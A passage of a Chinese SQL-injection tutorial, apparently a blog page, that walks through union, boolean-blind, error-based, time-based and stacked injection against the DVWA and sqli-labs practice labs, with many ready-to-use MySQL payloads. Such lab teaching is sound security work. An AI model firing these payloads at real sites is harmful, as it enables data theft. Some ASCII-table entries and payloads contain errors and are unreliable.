+<li>路，闭合后面的引号或者注释掉，注释掉采用&ndash;+ 或者#（%23）</li>
+</ul>
+<ol>
+<li>SQL中的逻辑运算</li>
+</ol>
+<ul>
+<li>这里我想说下逻辑运算的问题。</li>
+<li>提出一个问题Select * from users where id=1 and 1=1; 这条语句为什么能够选择出id=1</li>
+<li>的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。</li>
+<li>同时这个问题我们在使用万能密码的时候会用到。</li>
+<li>Select * from admin where username=’admin’ and password=’admin’</li>
+<li>我们可以用’or 1=1## 作为密码输入。原因是为什么？</li>
+<li>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：</li>
+<li>Select * from admin where username=’admin’ and password=’’or 1=1#’</li>
+<li>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。</li>
+<li>原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ and</li>
+<li>password=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先</li>
+<li>级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用</li>
+<li>b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三</li>
+<li>个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。</li>
+</ul>
+<p><img src="/imgs/0.44872611324886164-20220428154804-wnph38a.png" alt="image"></p>
+<ul>
+<li>①Select * from users where id=1 and 1=1;</li>
+<li>②Select * from users where id=1 &amp;&amp; 1=1;</li>
+<li>③Select * from users where id=1 &amp; 1=1;</li>
+<li>上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。</li>
+<li>③的意思是id=1 条件与1 进行&amp;位操作，id=1 被当作true，与1 进行&amp; 运算结果还是1，</li>
+<li>再进行=操作，1=1,还是1（ps：&amp;的优先级大于=）</li>
+<li>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要</li>
+<li>的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与</li>
+<li>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从</li>
+<li>ascii 值反推回字符。（运用较少）</li>
+</ul>
+<ol>
+<li>注入流程</li>
+</ol>
+<p><img src="/imgs/0.7959657112537458-20220428154804-onetyt9.png" alt="image"></p>
+<ul>
+<li>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。</li>
+</ul>
+<ol>
+<li>攻击类型</li>
+<li>Union注入</li>
+</ol>
+<ul>
+<li>情景：当查询结果会返回给前端时可用。</li>
+<li>测试环境DVWA&ndash;SQL Injection</li>
+</ul>
+<p><img src="/imgs/0.7631199562247144-20220428154804-nv1j3l2.png" alt="image"></p>
+<ul>
+<li>当输入1&rsquo; and &lsquo;1&rsquo;=&lsquo;2时，由于右边为假，所以返回的结果与上面的不同：</li>
+</ul>
+<p><img src="/imgs/0.6948858969261759-20220428154804-42yb3dh.png" alt="image"></p>
+<ul>
+<li>补充：</li>
+<li>order by&mdash;-用于对结果集进行排序。</li>
+<li>修改查询语句：</li>
+<li>1&rsquo; order by 1 &ndash;</li>
+<li>注：</li>
+<li>order by本来就是指定的结果如何排列，针对的就是查询结果而不是原表。所以order by猜解得到的列数还跟在后端的逻辑有关，即查询的结果有多少列有关。</li>
+</ul>
+<p><img src="/imgs/0.8239841288881523-20220428154804-2810gt4.png" alt="image"></p>
+<ul>
+<li>因为上面结果依然成立,所以，返回的列数应该不止1个，所以可以对order by的值进行递增，例如对1-10的范围进行测试，例如测试2：</li>
+<li>1&rsquo; order by 2 &ndash;</li>
+</ul>
+<p><img src="/imgs/0.7786452750297176-20220428154804-d1mpp49.png" alt="image"></p>
+<ul>
+<li>测试3：</li>
+<li>这个报错就说明返回的字段数小于3，所以可以得出结论，SQL语句执行的结果返回的内容中字段数为2</li>
+</ul>
+<p><img src="/imgs/0.7097031199954199-20220428154804-04rosdi.png" alt="image"></p>
+<ul>
+<li>因为一个一个去测试肯定麻烦，所以可以借助union：</li>
+<li>例如：</li>
+<li>uname=-1&rsquo; union select 1,2,3,4%23</li>
+<li>首先，select 之后可以接一串数字：1,2,3…只是一个例子，这串数字并不一定要按从小到大排列，也不一定从1开始，这串数字的值和顺序是任意的，甚至可以是重复的，如：11,465,7461，35 或11,11,11,11，数字串的长度也是任意的，我们想获得多少列的数据，就写多少个数字。</li>
+<li>我们都知道，select语句在指明要查询的内容属性（如select id）后，要加from指明是从哪个数据库表中获得数据，在数据库环境中我们一般会先写一句use xxxdatabase，之后写select from语句直接加当前数据库中的表名就可以了。如果我们没有声明使用哪个数据库，也可以直接写 select xxxx from security.users（假设要从security数据库的users表中获取数据）。而select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字，这时我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个1行n列的表，表的属性名和值都是我们输入的数组，如下图：</li>
+</ul>
+<p><img src="/imgs/0.9056061041855934-20220428154804-94bsldh.png" alt="image"></p>
+<ul>
+<li>那么这个东西有什么用呢？在SQL注入时，我们可以利用它来进行一个快速测试，在Union注入时，如果我们通过测试已经知道了前面语句的字段数，就可以写入union 注入语句，但存在一个问题，我们虽然可以通过注入获得想要的信息，但这些信息必须能够返回到我们手中，对于网页来说，如何能够让数据回显是至关重要的。例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。</li>
+<li>注：很多人可能刚接触的时候会懵逼，为什么select 后面跟一个数字，查询的结果返回的也是数字呢？这个就跟语法有关了，在数据库里执行一下就知道了：</li>
+</ul>
+<p><img src="/imgs/0.8820543581787544-20220428154804-mpw7ngn.png" alt="image"></p>
+<p><img src="/imgs/0.5787242951222089-20220428154804-y32cs6z.png" alt="image"></p>
+<ul>
+<li>此处DVWA的后端语句：</li>
+<li>SELECT first_name, last_name FROM users WHERE user_id = &lsquo;1&rsquo;;</li>
+<li>进行拼接：</li>
+<li>SELECT first_name, last_name FROM users WHERE user_id = &lsquo;1&rsquo; UNION SELECT 1,2,3,4 &ndash; ;</li>
+<li>这样一来，执行的时候前面的查询语句正常执行，同时又去执行后面的语句，当select的值存在时就会返回结果，当数字超过数据库表中的字段数的时候就会报错。（这里与order by有点区别）</li>
+<li>例如:</li>
+<li>1&rsquo; UNION SELECT 1,2,3,4 &ndash;</li>
+</ul>
+<p><img src="/imgs/0.3554450143640564-20220428154804-k48ajm7.png" alt="image"></p>
+<ul>
+<li>1&rsquo; UNION SELECT 1,2 &ndash;</li>
+</ul>
+<p><img src="/imgs/0.010541249545617675-20220428154804-4zppode.png" alt="image"></p>
+<ul>
+<li>说明这个表中一共有2个字段。</li>
+<li>从上面可以看到，因为我们输入的时候左边的查询是id=1，这样执行后会多出来一个查询结果，可能会影响我们的判断，所以这里我们可以将id设为-1，使得它查询失败就不会返回左边的查询结果，这样最后我们看到的查询结果就是union右边的语句的查询结果了。</li>
+<li> -1&rsquo; union select 1,2 &ndash;</li>
+</ul>
+<p><img src="/imgs/0.7274867069532509-20220428154804-1kacn9l.png" alt="image"></p>
+<ul>
+<li>上面返回的1和2的位置有回显，说明我们可以利用这两个点来查询信息然后在这里回显。</li>
+<li>例如，在1的位置查询当前数据库名，在2的位置查询当前用户名：</li>
+<li>-1&rsquo; UNION SELECT database(),user() &ndash;</li>
+</ul>
+<p><img src="/imgs/0.8019248790851287-20220428154804-ef5sena.png" alt="image"></p>
+<ul>
+<li>得到数据库名后，进一步查询表名：</li>
+</ul>
+<p><img src="/imgs/0.611093329769935-20220428154804-2s71ucj.png" alt="image"></p>
+<ul>
+<li>-1&rsquo; union select  (select table_name from information_schema.tables where table_schema=&lsquo;dvwa&rsquo; limit 0,1),2 &ndash;</li>
+<li>注：</li>
+<li>1.查询表名的语句需要用括号括起来</li>
+<li>2.查询表名最后面需要用limit的第一位数字来限制返回的条数为1条，否则会报错。</li>
+<li>3.如果需要查看下一条或指定的表名，修改limit的值即可。</li>
+</ul>
+<p><img src="/imgs/0.7305877606736492-20220428154804-f8nof6g.png" alt="image"></p>
+<ul>
+<li>这里得到表名为guestbook</li>
+<li>接下来，查询字段名：</li>
+<li>select column_name from information_schema.columns where table_schema=&lsquo;dvwa&rsquo; and table_name=&lsquo;guestbook&rsquo; limit 0,1</li>
+</ul>
+<p><img src="/imgs/0.5656575734831996-20220428154804-w7yoq6x.png" alt="image"></p>
+<ul>
+<li>完整语句：</li>
+<li>-1&rsquo; union select (select column_name from information_schema.columns where table_schema=&lsquo;dvwa&rsquo; and table_name=&lsquo;guestbook&rsquo; limit 0,1),2&ndash;</li>
+</ul>
+<p><img src="/imgs/0.842996561936571-20220428154804-cn67uih.png" alt="image"></p>
+<ul>
+<li>同理，查询下一个字段名时修改limit第一个数值即可。</li>
+</ul>
+<ol>
+<li>Boolean注入</li>
+</ol>
+<ul>
+<li>布尔注入是构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的，以此来获取数据库中的数据。</li>
+<li>情景：当查询结果不会回显，而只是提示yes/no时，使用Boolean</li>
+<li>测试环境DVWA&ndash;SQL Injection(Blind)</li>
+<li>先判断数据库名的长度：</li>
+<li>1&rsquo; and length(database())&gt;=1&ndash;</li>
+<li>首先，当输入1时，返回：</li>
+</ul>
+<p><img src="/imgs/0.26926296508706044-20220428154804-uytlhe8.png" alt="image"></p>
+<ul>
+<li>当ID不存在时：</li>
+</ul>
+<p><img src="/imgs/0.1503288603963927-20220428154804-e7z3fhd.png" alt="image"></p>
+<ul>
+<li>所以当提示ID存在时即查询是正确的，也即数据库名的长度大于我们指定的数值，当length(database())&gt;=n 且length(database())&lt;n+1时（n为正整数），n就是数据库名的长度。</li>
+<li>所以可以对n从1开始累加进行测试：</li>
+<li>当n=4时：</li>
+<li>1&rsquo; and length(database())&gt;=4&ndash;</li>
+</ul>
+<p><img src="/imgs/0.9155934859906161-20220428154804-ytxzjt9.png" alt="image"></p>
+<ul>
+<li>当n=5时：</li>
+<li>1&rsquo; and length(database())&gt;=5&ndash;</li>
+</ul>
+<p><img src="/imgs/0.09541748669172345-20220428154804-uuzn205.png" alt="image"></p>
+<ul>
+<li>所以数据库名的长度为4</li>
+<li>接下来使用逐字符确定的方式来确定数据库名：</li>
+<li>数据库名的范围一般是a<del>z、0</del>9，可能还有一些特殊字符，这里的字母不区分大小写。</li>
+<li>substr()——截取括号中的字符串，从第一个字符开始，每次只返回一个。这个是从1开始而limit是从0开始。</li>
+<li>逐字符判断的语句：</li>
+<li>1&rsquo; and substr(database(),1,1)=&rsquo;t&rsquo;&ndash;</li>
+</ul>
+<p><img src="/imgs/0.10846125327054136-20220428154804-uzfbj5v.png" alt="image"></p>
+<ul>
+<li>1&rsquo; and substr(database(),1,1)=&rsquo;d&rsquo;&ndash;</li>
+</ul>
+<p><img src="/imgs/0.28755388549665883-20220428154804-0rh3049.png" alt="image"></p>
+<ul>
+<li>ID存在说明第一位是d</li>
+<li>接着查询第二位：</li>
+<li>1&rsquo; and substr(database(),2,1)=&lsquo;v&rsquo;&ndash;</li>
+</ul>
+<p><img src="/imgs/0.17382686034920117-20220428154804-oojfuvh.png" alt="image"></p>
+<ul>
+<li>第三位：</li>
+<li>1&rsquo; and substr(database(),3,1)=&lsquo;w&rsquo;&ndash;</li>
+</ul>
+<p><img src="/imgs/0.30986225461833866-20220428154804-gsrouvz.png" alt="image"></p>
+<ul>
+<li>第四位：</li>
+<li>1&rsquo; and substr(database(),4,1)=&lsquo;a&rsquo;&ndash;</li>
+</ul>
+<p><img src="/imgs/0.461598940604895-20220428154804-iynwvkv.png" alt="image"></p>
+<ul>
+<li>因为长度为4，所以最终数据库名为“dvwa”，以上枚举的时候可以使用burp进行枚举。</li>
+<li>还可以利用ASCII码的字符来进行查询：</li>
+<li>在MySQL中将字符转换为ASCII的函数为ord,根据ASCII表中字符对应的值来进行判断：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>ASCII值</th>
+<th>控制字符</th>
+<th>ASCII值</th>
+<th>控制字符</th>
+<th>ASCII值</th>
+<th>控制字符</th>
+<th>ASCII值</th>
+<th>控制字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>NUT</td>
+<td>32</td>
+<td>(space)</td>
+<td>64</td>
+<td>@</td>
+<td>96</td>
+<td>、</td>
+</tr>
+<tr>
+<td>1</td>
+<td>SOH</td>
+<td>33</td>
+<td>!</td>
+<td>65</td>
+<td>A</td>
+<td>97</td>
+<td>a</td>
+</tr>
+<tr>
+<td>2</td>
+<td>STX</td>
+<td>34</td>
+<td>&quot;</td>
+<td>66</td>
+<td>B</td>
+<td>98</td>
+<td>b</td>
+</tr>
+<tr>
+<td>3</td>
+<td>ETX</td>
+<td>35</td>
+<td>#</td>
+<td>67</td>
+<td>C</td>
+<td>99</td>
+<td>c</td>
+</tr>
+<tr>
+<td>4</td>
+<td>EOT</td>
+<td>36</td>
+<td>$</td>
+<td>68</td>
+<td>D</td>
+<td>100</td>
+<td>d</td>
+</tr>
+<tr>
+<td>5</td>
+<td>ENQ</td>
+<td>37</td>
+<td>%</td>
+<td>69</td>
+<td>E</td>
+<td>101</td>
+<td>e</td>
+</tr>
+<tr>
+<td>6</td>
+<td>ACK</td>
+<td>38</td>
+<td>&amp;</td>
+<td>70</td>
+<td>F</td>
+<td>102</td>
+<td>f</td>
+</tr>
+<tr>
+<td>7</td>
+<td>BEL</td>
+<td>39</td>
+<td>,</td>
+<td>71</td>
+<td>G</td>
+<td>103</td>
+<td>g</td>
+</tr>
+<tr>
+<td>8</td>
+<td>BS</td>
+<td>40</td>
+<td>(</td>
+<td>72</td>
+<td>H</td>
+<td>104</td>
+<td>h</td>
+</tr>
+<tr>
+<td>9</td>
+<td>HT</td>
+<td>41</td>
+<td>)</td>
+<td>73</td>
+<td>I</td>
+<td>105</td>
+<td>i</td>
+</tr>
+<tr>
+<td>10</td>
+<td>LF</td>
+<td>42</td>
+<td>*</td>
+<td>74</td>
+<td>J</td>
+<td>106</td>
+<td>j</td>
+</tr>
+<tr>
+<td>11</td>
+<td>VT</td>
+<td>43</td>
+<td>+</td>
+<td>75</td>
+<td>K</td>
+<td>107</td>
+<td>k</td>
+</tr>
+<tr>
+<td>12</td>
+<td>FF</td>
+<td>44</td>
+<td>,</td>
+<td>76</td>
+<td>L</td>
+<td>108</td>
+<td>l</td>
+</tr>
+<tr>
+<td>13</td>
+<td>CR</td>
+<td>45</td>
+<td>-</td>
+<td>77</td>
+<td>M</td>
+<td>109</td>
+<td>m</td>
+</tr>
+<tr>
+<td>14</td>
+<td>SO</td>
+<td>46</td>
+<td>.</td>
+<td>78</td>
+<td>N</td>
+<td>110</td>
+<td>n</td>
+</tr>
+<tr>
+<td>15</td>
+<td>SI</td>
+<td>47</td>
+<td>/</td>
+<td>79</td>
+<td>O</td>
+<td>111</td>
+<td>o</td>
+</tr>
+<tr>
+<td>16</td>
+<td>DLE</td>
+<td>48</td>
+<td>0</td>
+<td>80</td>
+<td>P</td>
+<td>112</td>
+<td>p</td>
+</tr>
+<tr>
+<td>17</td>
+<td>DCI</td>
+<td>49</td>
+<td>1</td>
+<td>81</td>
+<td>Q</td>
+<td>113</td>
+<td>q</td>
+</tr>
+<tr>
+<td>18</td>
+<td>DC2</td>
+<td>50</td>
+<td>2</td>
+<td>82</td>
+<td>R</td>
+<td>114</td>
+<td>r</td>
+</tr>
+<tr>
+<td>19</td>
+<td>DC3</td>
+<td>51</td>
+<td>3</td>
+<td>83</td>
+<td>S</td>
+<td>115</td>
+<td>s</td>
+</tr>
+<tr>
+<td>20</td>
+<td>DC4</td>
+<td>52</td>
+<td>4</td>
+<td>84</td>
+<td>T</td>
+<td>116</td>
+<td>t</td>
+</tr>
+<tr>
+<td>21</td>
+<td>NAK</td>
+<td>53</td>
+<td>5</td>
+<td>85</td>
+<td>U</td>
+<td>117</td>
+<td>u</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SYN</td>
+<td>54</td>
+<td>6</td>
+<td>86</td>
+<td>V</td>
+<td>118</td>
+<td>v</td>
+</tr>
+<tr>
+<td>23</td>
+<td>TB</td>
+<td>55</td>
+<td>7</td>
+<td>87</td>
+<td>W</td>
+<td>119</td>
+<td>w</td>
+</tr>
+<tr>
+<td>24</td>
+<td>CAN</td>
+<td>56</td>
+<td>8</td>
+<td>88</td>
+<td>X</td>
+<td>120</td>
+<td>x</td>
+</tr>
+<tr>
+<td>25</td>
+<td>EM</td>
+<td>57</td>
+<td>9</td>
+<td>89</td>
+<td>Y</td>
+<td>121</td>
+<td>y</td>
+</tr>
+<tr>
+<td>26</td>
+<td>SUB</td>
+<td>58</td>
+<td>:</td>
+<td>90</td>
+<td>Z</td>
+<td>122</td>
+<td>z</td>
+</tr>
+<tr>
+<td>27</td>
+<td>ESC</td>
+<td>59</td>
+<td>;</td>
+<td>91</td>
+<td>[</td>
+<td>123</td>
+<td>{</td>
+</tr>
+<tr>
+<td>28</td>
+<td>FS</td>
+<td>60</td>
+<td>&lt;</td>
+<td>92</td>
+<td>/</td>
+<td>124</td>
+<td></td>
+</tr>
+<tr>
+<td>29</td>
+<td>GS</td>
+<td>61</td>
+<td>=</td>
+<td>93</td>
+<td>]</td>
+<td>125</td>
+<td>}</td>
+</tr>
+<tr>
+<td>30</td>
+<td>RS</td>
+<td>62</td>
+<td>&gt;</td>
+<td>94</td>
+<td>^</td>
+<td>126</td>
+<td>`</td>
+</tr>
+<tr>
+<td>31</td>
+<td>US</td>
+<td>63</td>
+<td>?</td>
+<td>95</td>
+<td>_</td>
+<td>127</td>
+<td>DEL</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>例如:</li>
+<li>d&mdash;-100</li>
+<li>v&mdash;-118</li>
+<li>w&mdash;-119</li>
+<li>a&mdash;&ndash;97</li>
+<li>查询语句：</li>
+<li>1&rsquo; and ord(substr(database(),1,1))=100&ndash;</li>
+</ul>
+<p><img src="/imgs/0.4268383306458863-20220428154804-weoxtn9.png" alt="image"></p>
+<ul>
+<li>1&rsquo; and ord(substr(database(),2,1))=118&ndash;</li>
+</ul>
+<p><img src="/imgs/0.8353187035580693-20220428154804-rtmrdty.png" alt="image"></p>
+<ul>
+<li>1&rsquo; and ord(substr(database(),3,1))=119&ndash;</li>
+</ul>
+<p><img src="/imgs/0.41351213058790226-20220428154804-5no9r45.png" alt="image"></p>
+<ul>
+<li>1&rsquo; and ord(substr(database(),4,1))=97&ndash;</li>
+</ul>
+<p><img src="/imgs/0.0450682288640861-20220428154804-a78euw2.png" alt="image"></p>
+<ul>
+<li>得到数据库名“dvwa”</li>
+<li>接着查询表名：</li>
+<li>1&rsquo; and substr((select table_name from information_schema.tables where table_schema=&lsquo;dvwa&rsquo; limit 0,1),1,1)=a&ndash;</li>
+<li>或</li>
+<li>1&rsquo; and ord(substr((select table_name from information_schema.tables where table_schema=&lsquo;dvwa&rsquo; limit 0,1),1,1))=100&ndash;</li>
+<li>同理，可以直接使用substr也可以是结合ord，然后都是对后面的字符或ASCII码进行不断的尝试，最后根据返回信息判断是否正确即可。</li>
+</ul>
+<ol>
+<li>报错注入</li>
+</ol>
+<ul>
+<li>报错注入的函数较多，常见的如下：</li>
+<li>(1) count() , rand() , group by</li>
+<li>(2) XML函数之ExtractValue()</li>
+<li>(3)XML函数之updatexml()</li>
+<li>(4) name_const() 重复报错(不推荐)</li>
+<li>测试环境：sqli-labs的Error Based Less-1</li>
+<li>正常访问：</li>
+</ul>
+<p><img src="/imgs/0.3182367664726859-20220428154804-19asg9y.png" alt="image"></p>
+<ul>
+<li>加单引号：</li>
+</ul>
+<p><img src="/imgs/0.4845784548216476-20220428154804-mxfva07.png" alt="image"></p>
+<ul>
+<li>因为单引号导致了其SQL语句的结构出现错误。可以看到这里报错信息中将敏感信息返回给了前端，所以可以利用报错注入获取数据。报错注入有多种格式，例如函数uodatexml()。</li>
+<li>补充：concat()</li>
+<li>1、功能：将多个字符串连接成一个字符串。</li>
+<li>2、语法：concat(str1, str2,&hellip;)</li>
+</ul>
+<ol>
+<li>updatexml()</li>
+</ol>
+<ul>
+<li>测试：利用updatexml()获取user()的值：</li>
+<li>1&rsquo; and updatexml(1,concat(0x7e,(select user()),0x7e),1)&ndash;+</li>
+<li>注:上面的0x7e是ASCII编码，对应的是~~,这个只是为了将我们要的信息更显眼的凸显出来，所以在信息的两边加个~~，并非固定的，可以换别的字符。</li>
+<li>例如换成中括号：[对应0x5B   ]对应0x5D(这里一定要加上0x否则报错)</li>
+<li>1&rsquo; and updatexml(1,concat(0x5B,(select user()),0x5D),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.91607451157131-20220428154804-dgsxytd.png" alt="image"></p>
+<ul>
+<li>可以看到XPATH报错，将user()回显了出来：</li>
+</ul>
+<p><img src="/imgs/0.6822943968132726-20220428154804-wjao6ys.png" alt="image"></p>
+<ul>
+<li>同理获取数据库：</li>
+<li>1&rsquo; and updatexml(1,concat(0x7e,(select database()),0x7e),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.2395419192255878-20220428154804-irsohao.png" alt="image"></p>
+<ul>
+<li>接着获取其其他的数据库名、表名和字段名：</li>
+<li>数据库名：</li>
+<li>1&rsquo; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.3119973506209124-20220428154804-arlj3es.png" alt="image"></p>
+<ul>
+<li>表名：</li>
+<li>1&rsquo; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1),0x7e),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.02344901124420911-20220428154804-kooz6kp.png" alt="image"></p>
+<ul>
+<li>字段名：</li>
+<li>1&rsquo; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns limit 0,1),0x7e),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.017156006376287062-20220428154804-31j6dvs.png" alt="image"></p>
+<ul>
+<li>报错注入的代码中，肯定有语句是将错误信息输出的，所以当出错时才会将错误信息输出，例如mysqli_error返回上一个MySQL函数的错误。</li>
+</ul>
+<ol>
+<li>floor()</li>
+</ol>
+<ul>
+<li>测试环境：Less - 5</li>
+<li>单引号判断，报错：</li>
+</ul>
+<p><img src="/imgs/0.21052721243820766-20220428154804-1imayps.png" alt="image"></p>
+<ul>
+<li>通过floor报错注入</li>
+<li>and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)&ndash;+</li>
+<li>其中payload为你要插入的SQL语句</li>
+<li>查数据库：</li>
+<li><a href="http://192.168.10.137/Less-5/?id=1'">http://192.168.10.137/Less-5/?id=1&rsquo;</a> union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 &ndash;</li>
+</ul>
+<p><img src="/imgs/0.4136078092377306-20220428154804-jagosci.png" alt="image"></p>
+<ul>
+<li> 查用户：</li>
+<li><a href="http://192.168.10.137/Less-5/?id=1'">http://192.168.10.137/Less-5/?id=1&rsquo;</a> union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a &ndash;+</li>
+</ul>
+<p><img src="/imgs/0.2978054800916303-20220428154804-iro9cac.png" alt="image"></p>
+<ul>
+<li> 表名</li>
+<li><a href="http://192.168.10.137/Less-5/?id=1'">http://192.168.10.137/Less-5/?id=1&rsquo;</a> union select null,count(*),concat((select column_name from information_schema.columns where table_name=&lsquo;users&rsquo; limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</li>
+</ul>
+<p><img src="/imgs/0.9192392531819953-20220428154804-mge3boi.png" alt="image"></p>
+<ul>
+<li> 爆字段</li>
+<li><a href="http://192.168.10.137/Less-5/?id=1'">http://192.168.10.137/Less-5/?id=1&rsquo;</a> union select null,count(*),concat((select column_name from information_schema.columns where table_name=&lsquo;users&rsquo; limit 1,1),floor(rand()*2))as a from information_schema.tables group by a%23</li>
+</ul>
+<p><img src="/imgs/0.44992087646894835-20220428154804-jngbge1.png" alt="image"></p>
+<ul>
+<li> 爆内容：</li>
+<li><a href="http://192.168.10.137/Less-5/?id=1'">http://192.168.10.137/Less-5/?id=1&rsquo;</a> union select null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</li>
+</ul>
+<p><img src="/imgs/0.838906346985383-20220428154804-4c2pfo9.png" alt="image"></p>
+<ol>
+<li>时间注入</li>
+</ol>
+<ul>
+<li>测试环境：sqli-labs的Blind Time Based</li>
+<li>同Boolean注入一样，当遇到返回结果为YES或NO时，也可以尝试时间注入。</li>
+<li>主要利用sleep()或benchmark()等函数让MySQL的执行时间变长。时间盲注多与IF(expr1,expr2,expr3)结合使用，语义是：如果expr1是TRUE，则IF()的返回值为expr2；否则返回值为expr3。所以判断数据库库名长度的语句应为：</li>
+<li>if(length(database())&gt;1,sleep(5),1)&ndash;+</li>
+<li>上面这行语句的意思是，如果数据库名长度大于1，则MySQL查询休眠5秒，否则返回1。</li>
+<li>插入到注入点的语句为：</li>
+<li>?id=1&rsquo; and if(length(database())&gt;1,sleep(5),1)&ndash;+</li>
+<li>如果数据库名长度小于1，则语句变成了?id1&rsquo; and 1&ndash;+</li>
+<li>相当于执行了两步：</li>
+<li>左边 select id=1&hellip;..</li>
+<li>右边 select 1</li>
+<li>而查询1的结果，大约只有几十毫秒，根据BurpSuit中页面的响应时间，可以判断条件是否正确。</li>
+<li>1&rsquo;+and+if(length(database())&gt;1,sleep(5),1)&ndash;+</li>
+<li>注释：如果要在URL中使用#号来注释，需要进行URL编码&mdash;-%23</li>
+</ul>
+<p><img src="/imgs/0.9593951454211248-20220428154804-kphz987.png" alt="image"></p>
+<ul>
+<li>1&rsquo;+and+if(length(database())&gt;100,sleep(5),1)&ndash;+</li>
+</ul>
+<p><img src="/imgs/0.46651694229833784-20220428154804-zbs1jwi.png" alt="image"></p>
+<ul>
+<li>通过两种情况返回的时间长短即可判断出来数据库长度了。</li>
+<li>经过测试此处的长度为7：</li>
+</ul>
+<p><img src="/imgs/0.2572184404977795-20220428154804-xelwdtk.png" alt="image"></p>
+<p><img src="/imgs/0.17150203055537347-20220428154804-6uzv5h8.png" alt="image"></p>
+<ul>
+<li>接下来就是查询数据库名的每一位。与Boolean注入类似，使用substr函数，语句为：</li>
+<li>?id=1&rsquo; and if(substr(database(),1,1))=&rsquo;s&rsquo;,sleep(5),1)&ndash;+</li>
+<li>含义：从数据库名的第一位开始取一位，如果这一位字符是s则为true，执行 sleep(5)，否则查询1。</li>
+<li>因为前面我们已经知道长度是7，所以这里需要对7位的字符进行枚举，知道出现sleep(5)才算枚举出来一位。</li>
+<li>同样的，这里也可以结合ord函数的ASCII进行查询，如：</li>
+<li>?id=1&rsquo; and if(ord(substr(database()),1,1))=114,sleep(5),1)&ndash;+</li>
+</ul>
+<ol>
+<li>堆叠查询注入</li>
+</ol>
+<ul>
+<li>测试环境：SQLi-LABS Page-3 (Stacked Injections)&ndash;Less-38</li>
+<li>堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。首先访问id=1&rsquo;,页面返回MySQL错误，再访问id=1&rsquo;%23,页面返回正常结果。这里可以使用Boolean注入、时间注入，也可以使用另外一种注入方式&mdash;-堆叠注入。</li>
+<li>堆叠注入的语句为：</li>
+<li>&lsquo;;select if(substr(user(),1,1)=&lsquo;r&rsquo;,sleep(3),1)%23</li>
+<li>可以看到分号后面的语句其实就是时间盲注的语句。</li>
+<li>&lsquo;;select if(sbustr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&lsquo;e&rsquo;,sleep(3),1)%23</li>
+<li>造成堆叠查询的原因是代码中使用了PDO来执行SQL语句，可以执行多语句，不过这样通常不能直接得到注入的结果，因为PDO只会返回第一条SQL语句执行的结果，所以，第二条语句需要使用update来更新已有数据或者使用时间盲注来进行注入，因为这样在不返回第二条语句的执行结果时，也能通过第二条语句产生的影响来判断执行情况。</li>
+</ul>
+<ol>
+<li>二次注入</li>
+</ol>
+<ul>
+<li>测试环境：SQLi-LABS Less-13</li>
+<li>源码：</li>
+<li>// connectivity @$sql=&ldquo;SELECT username, password FROM users WHERE username=(&rsquo;$uname&rsquo;) and password=(&rsquo;$passwd&rsquo;) LIMIT 0,1&rdquo;;</li>
+<li>$result=mysql_query($sql); $row = mysql_fetch_array($result);</li>
+<li>Payload：</li>
+<li>第一种：</li>
+<li>uname=test&rsquo;) or 1=1#</li>
+<li>passwd=任意值</li>
+<li>完整语句：</li>
+<li>SELECT username, password FROM users WHERE username=(&rsquo;test&rsquo;) or 1=1#&rsquo;) and password=(&lsquo;任意值&rsquo;) LIMIT 0,1</li>
+<li>第二种：</li>
+<li>uname=test&rsquo;) or (&lsquo;1&rsquo;)=(&lsquo;1</li>
